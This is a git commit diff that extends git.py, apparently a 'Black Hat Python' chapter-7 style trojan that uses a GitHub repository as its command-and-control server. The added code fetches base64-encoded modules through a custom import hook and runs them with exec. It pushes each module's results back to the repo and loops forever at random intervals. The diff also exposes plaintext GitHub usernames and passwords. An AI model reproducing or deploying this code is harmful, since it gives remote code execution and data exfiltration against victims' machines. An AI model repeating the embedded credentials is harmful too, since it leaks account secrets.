36e89e50094e05bc312f01d94844ccad6795ea8c
Tone.bursT <samsara1993@126.com>
2015-05-19 16:52:43 +0800

    Seems functionally complete

--- git.py
+++ git.py
@@ -13,29 +13,30 @@ import threading
 from github3 import login
 
 
+
 # trojan id
 trojan_id = 'simple'
 trojan_config = '%s.json' % trojan_id
 trojan_data = 'data/%s/' % trojan_id
 trojan_modules = []
 configured = False
-trojan_queue = queue.Queue()
+task_queue = queue.Queue()
 
 
-def connet2git():
-    git = login(username='wick.zt', password='Ithink')
-    repo = git.repository('wick.zt', 'BHP7')
-    branch = repo.branch('master')
-    return git, repo, branch
+def connect2git():
+    git = login(username='wick-ztone', password='1097393685Ss')
+    repo = git.repository('wick-ztone', 'BHP-Chapter7')
+    br = repo.branch('master')
+    return git, repo, br
 
 
 def get_contents(filepath):
-    git, repo, branch = connet2git()
-    tree = branch.commit.commit.tree.recurse()
+    git, repo, br = connect2git()
+    tree = br.commit.commit.tree.recurse()
     for f in tree.tree:
         if filepath in f.path:
             print('[*] Found file %s' % filepath)
-            blob = repo.blob(f._json_data['sha'])
+            blob = repo.blob(f.sha)
             return blob.content
     return None
 
@@ -43,17 +44,59 @@ def get_contents(filepath):
 def get_config():
     global configured
     _json = get_contents(trojan_config)
-    cnf = json.loads(base64.b64decode(_json))
+    conf = json.loads(base64.b64decode(_json))
     configured = True
-    for task in cnf:
+    for task in conf:
         if task['module'] not in sys.modules:
             exec('import %s' % task['module'])
-    return cnf
+    return conf
 
 
 def store_module_result(data):
-    git, repo, branch = connet2git()
+    git, repo, br = connect2git()
     # remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
     remote_path = 'data/%s/%d.data' % (trojan_id, id(trojan_id))
-    repo.create_file(remote_path, 'Commit message', base64.b64encode(data))
+    repo.create_file(remote_path, 
+                     'Push the data of %s' % trojan_id, 
+                     base64.b64encode(data))
 
+
+
+class GitImport(object):
+    def __init__(self):
+        self.__code = ''
+    
+    def find_module(self, fullname, path=None):
+        if configured:
+            print('[*] Attempting to retrieve %s' % fullname)
+            new_library = get_contents('modules/%s' % fullname)
+            if new_library:
+                self.__code = base64.b64decode(new_library)
+                print('[*] Successfully retrieved %s' % fullname)
+                return self
+        return None
+
+    def load_module(self, name):
+        module = imp.new_module(name)
+        exec(self.__code, module.__dict__)
+        sys.modules[name] = module
+        return module
+
+
+def run_module(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+    store_module_result(result)
+
+
+# main trojan loop
+sys.meta_path = [GitImport()]
+while True:
+    if task_queue.empty():
+        conf = get_config()
+        for task in conf:
+            t = threading.Thread(target=run_module, args=(task['module'], ))
+            t.start()
+            time.sleep(random.randint(1, 10))
+    time.sleep(random.randint(1000, 10000))
